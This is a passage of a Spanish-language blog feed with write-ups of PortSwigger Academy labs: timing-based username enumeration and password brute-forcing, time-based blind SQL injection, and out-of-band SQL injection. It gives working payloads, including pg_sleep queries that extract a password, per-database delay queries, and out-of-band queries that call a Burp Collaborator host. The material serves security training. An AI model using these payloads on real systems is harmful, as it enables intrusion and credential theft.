&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Las listas se pueden encontrar en la &lt;!-- raw HTML omitted --&gt;lista de seclists&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;.&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Ahora que podemos saltar este bloqueo ya podemos seguir con el ataque. Basandonos en la respuesta sabremos identificar usuarios en el sistema, solo toca enviar los multiples usuarios y saber cual esta registrado, utilizando la lista de usuarios antes mencionados. Para eso lanzamos el ataque y cambiando la posicion 1 con numeros y valores aleatorios para generar el cambio de ip aleatorio y que no se bloquee la solicitud. Algo a notar es que ya que esta solicitud hace una validacion de usuario y contrasena por lo que si enviamos una contrasena muy larga el sistema tardara mucho mas en enviarnos la respuesta.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 233; 
			flex-basis: 560px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/intruder.png&#34; data-size=&#34;1278x547&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/intruder.png&#34;
			width=&#34;1278&#34;
			height=&#34;547&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/intruder_hu7c2bf7bf3e1803c6e4011bb39fe35b6a_88157_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/intruder_hu7c2bf7bf3e1803c6e4011bb39fe35b6a_88157_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder Position&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder Position&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 115; 
			flex-basis: 276px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/intruder2.png&#34; data-size=&#34;676x586&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/intruder2.png&#34;
			width=&#34;676&#34;
			height=&#34;586&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/intruder2_hueaac38b166ce2aad98fdf456ff4c3b68_20852_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/intruder2_hueaac38b166ce2aad98fdf456ff4c3b68_20852_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder Payloads&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder Payloads&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al realizar el ataque ya tenemos resultados y nos fijaremos en el tiempo de la respuesta recibida, en este caso el usuario es &lt;code&gt;af&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 401; 
			flex-basis: 964px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/resultado.png&#34; data-size=&#34;1145x285&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/resultado.png&#34;
			width=&#34;1145&#34;
			height=&#34;285&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/resultado_hude0a9408eca661fc4e4eea99e4e6673c_18001_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/resultado_hude0a9408eca661fc4e4eea99e4e6673c_18001_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Respuestas del ataque de usuarios&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Respuestas del ataque de usuarios&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Como vemos esta la respuesta tarda en recibir, por lo que ahora haremos el mismo proceso, pero cambiando la posicion a la contrasena con el listado de contrasenas, y recibimos uno con codigo de respuesta &lt;code&gt;302&lt;/code&gt; asi que la contrasena es &lt;code&gt;jennifer&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 277; 
			flex-basis: 666px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/resultado2.png&#34; data-size=&#34;794x286&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/resultado2.png&#34;
			width=&#34;794&#34;
			height=&#34;286&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/resultado2_hu55ae3d390b7f7d4a687c9cbd2c296cf1_13736_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/resultado2_hu55ae3d390b7f7d4a687c9cbd2c296cf1_13736_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Respuestas del ataque de contrasenas&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Respuestas del ataque de contrasenas&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 444px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/resuelto.png&#34; data-size=&#34;1753x947&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/resuelto.png&#34;
			width=&#34;1753&#34;
			height=&#34;947&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/resuelto_hucd9277e5c3e7f30522896801e30140d2_98784_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/resuelto_hucd9277e5c3e7f30522896801e30140d2_98784_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/danielmiessler/SecLists/tree/master/Miscellaneous/web/http-request-headers&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Lista de seclists http-request-headers&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 14</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/</link>
        <pubDate>Thu, 11 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 14" /&gt;&lt;h1 id=&#34;lab-blind-sql-injection-with-time-delays&#34;&gt;Lab: Blind SQL injection with time delays&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder explotar una vulnerabilidad de sql injection pero basandose en tiempo, la cual se utilizara posteriormente para poder extraer los datos del usuario y contrasena de la tabla usuers.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Basandonos en la siguiente &lt;!-- raw HTML omitted --&gt;lista&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt; encontramos que inyectando la siguiente consulta podemos ejecutar un delay, sabiendo que la aplicacion es backend &lt;code&gt;postgresql&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;xxxxxxxxx&#39; AND 1337=(SELECT 1337 FROM PG_SLEEP(10)) AND &#39;1337&#39;=&#39;1337 //inyectar esto no dejara ejecutar conditional time delay
xxxxxxxxx&#39;%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- //%3B para no tener conflicto en repeater al colocar &#39;;&#39; en la cookie
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Podemos inyectar las siguientes consultas para crearla:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Backend&lt;/th&gt;
&lt;th&gt;Consulta SQL&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Oracle&lt;/td&gt;
&lt;td&gt;SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN &amp;lsquo;a&amp;rsquo;||dbms_pipe.receive_message((&amp;lsquo;a&amp;rsquo;),10) ELSE NULL END FROM dual&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Microsoft&lt;/td&gt;
&lt;td&gt;IF (YOUR-CONDITION-HERE) WAITFOR DELAY &amp;lsquo;0:0:10&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PostgreSQL&lt;/td&gt;
&lt;td&gt;SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MySQL&lt;/td&gt;
&lt;td&gt;SELECT IF(YOUR-CONDITION-HERE,sleep(10),&amp;lsquo;a&amp;rsquo;)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;p&gt;Ahora toca crear una consulta para extraer los valores de la contrasena de la tabla &lt;code&gt;users&lt;/code&gt;, creando la siguiente consulta, sabiendo que es &lt;code&gt;postgresql&lt;/code&gt;. Como en los anteriores sabemos que son 20 caracteres en este caso vamos a utilizar la siguiente consulta, utilizando clusterbomb, el primero como valor numero de 1 a 20 y el 2 con una lista de caracteres alfanumericos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;%3BSELECT CASE WHEN (username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;administrator&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and substr(password,&amp;lt;valor cambiante 1 a 20&amp;gt;,1)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;valor&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;alfanumerico&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;) THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 235; 
			flex-basis: 565px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/intruder.png&#34; data-size=&#34;1340x569&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/intruder.png&#34;
			width=&#34;1340&#34;
			height=&#34;569&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/intruder_hua3bb1f5623a1881c7205a7d61c173e1d_61681_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/intruder_hua3bb1f5623a1881c7205a7d61c173e1d_61681_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ataque con intruder&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ataque con intruder&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto ya tenemos la contrasena del usuario &lt;code&gt;administrator&lt;/code&gt; que es &lt;code&gt;ifp6pjrl8u4oy2xp9e3b&lt;/code&gt;. Y algo a tomar en cuenta es al hacer inyecciones de este tipo, la respuesta de las peticiones al hacerse juntas la respuesta tardara igual en todas, asi que lo justo es no enviar en hilos ya que no sabremos cual sera la respuesta que tarde mas ya que se replicara en varias respuestas.&lt;/p&gt;
&lt;h4 id=&#34;extraer-datos&#34;&gt;Extraer datos&lt;/h4&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 205; 
			flex-basis: 493px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/resuelto.png&#34; data-size=&#34;1762x857&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/resuelto.png&#34;
			width=&#34;1762&#34;
			height=&#34;857&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/resuelto_hu0900f70a950cadf08f43b3a81f97008f_97050_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/resuelto_hu0900f70a950cadf08f43b3a81f97008f_97050_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;lista.txt&#34; &gt;Lista de Payloads SQL Injection Time Based&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 15</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/</link>
        <pubDate>Thu, 11 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 15" /&gt;&lt;h1 id=&#34;lab-blind-sql-injection-with-out-of-band-interaction&#34;&gt;Lab: Blind SQL injection with out-of-band interaction&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder inyectar una consulta sql y basandonos en la ejecucion que pueda realizar el backend una consulta hacia un endpoint y genere una accion, en este caso de esto se trata. Mas que todo donde los otros tipos de sql injection a ciegas no puede llegar.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Burpsuite cuenta con una propia herramienta que es Burp Collaborator que lo que hace es apoyar a detectar vulnerabilidades a ciegas. Pero si no se cuenta con Burpsuite Pro no se puede utilizar, asi que se listan a continuacion algunas alternativas para poder explotar esta vulnerabilidad.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;En el laboratorio no se puede realizar alguna de estas alternativas ya que el firewall de PortswiggerAcademy bloquea&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://dnslog.cn/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://dnslog.cn/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://webhook.site/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://webhook.site/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://app.interactsh.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://app.interactsh.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://pingb.in/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://pingb.in/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://swin.es/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://swin.es/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://ceye.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://ceye.io/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://canarytokens.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://canarytokens.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://requestbin.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://requestbin.net/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://beeceptor.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://beeceptor.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;p&gt;Los payloads a inyectar segun la base de datos son los siguientes:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Backend&lt;/th&gt;
&lt;th&gt;Consulta&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Oracle&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT extractvalue(xmltype(&#39;\&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;\&amp;lt;!DOCTYPE root [ \&amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&amp;quot;&amp;gt; %remote;]&amp;gt;&#39;),&#39;/l&#39;) FROM dual&lt;/code&gt; o &lt;code&gt;SELECT UTL_INADDR.get_host_address(&#39;YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;)&lt;/code&gt; solo con privilegios elevados&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Microsoft&lt;/td&gt;
&lt;td&gt;&lt;code&gt;exec master..xp_dirtree &#39;//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&#39;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PostgreSQL&lt;/td&gt;
&lt;td&gt;&lt;code&gt;copy (SELECT &#39;&#39;) to program &#39;nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MySQL&lt;/td&gt;
&lt;td&gt;&lt;code&gt;LOAD_FILE(&#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a&#39;)&lt;/code&gt; solo trabaja en windows o &lt;code&gt;SELECT ... INTO OUTFILE &#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;explotar&#34;&gt;Explotar&lt;/h4&gt;
&lt;p&gt;Utilizando una de las consultas podemos inyectar una consulta y enviar la consulta, y ahora collaborate nos enviara las peticiones que se han realizado.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;xxxxxxxxxxxxxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fxml&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;encoding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DOCTYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&amp;lt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ENTITY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SYSTEM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http%3a//gcwtmppkxyte3s4zwxzqbfkig9mba0.burpcollaborator.net/&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;+%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;),&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)+FROM+dual--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 143; 
			flex-basis: 343px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/repeater.png&#34; data-size=&#34;1539x1075&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/repeater.png&#34;
			width=&#34;1539&#34;
			height=&#34;1075&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/repeater_hu5decb89ea607d037ca51e48705c853ff_151973_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/repeater_hu5decb89ea607d037ca51e48705c853ff_151973_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Envio de consulta con repeater&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Envio de consulta con repeater&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 217; 
			flex-basis: 523px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto.png&#34; data-size=&#34;1761x808&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto.png&#34;
			width=&#34;1761&#34;
			height=&#34;808&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto_hudb1d6fd86e50b409045069c012032baa_103793_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto_hudb1d6fd86e50b409045069c012032baa_103793_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
